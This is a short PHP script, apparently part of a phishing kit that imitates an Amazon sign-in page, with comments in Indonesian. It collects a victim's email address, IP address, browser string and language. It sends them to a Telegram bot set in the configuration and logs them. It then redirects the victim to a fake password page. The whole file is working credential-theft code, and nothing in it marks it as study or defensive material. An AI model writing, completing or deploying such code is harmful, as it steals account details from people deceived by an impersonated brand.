<?php
session_start();
require_once '../function.php';
require_once '../system/class/Telegram.php';

global $config;

$email = trim($_POST['email'] ?? '');

if (empty($email) || !filter_var($email, FILTER_VALIDATE_EMAIL)) {
    header('Location: ../views/amazon.html?error=email');
    exit;
}

// Simpan ke sesi
$_SESSION['email'] = $email;
$_SESSION['ip'] = getIp();
$_SESSION['user_agent'] = substr($_SERVER['HTTP_USER_AGENT'] ?? '-', 0, 150);
$_SESSION['bahasa'] = detectLang();

// Kirim ke Telegram
if ($config['kirim_ke_telegram']) {
    $tg = new Telegram($config['telegram_bot_token'], $config['telegram_chat_id']);
    $pesan = $tg->formatLogin(
        $email,
        $_SESSION['ip'],
        $_SESSION['user_agent'],
        $_SESSION['bahasa']
    );
    $tg->kirim($pesan);
    simpanLog('login', "Email: {$email} | IP: {$_SESSION['ip']}");
}

// Lanjut ke halaman sandi
header('Location: ../views/password.html');
exit;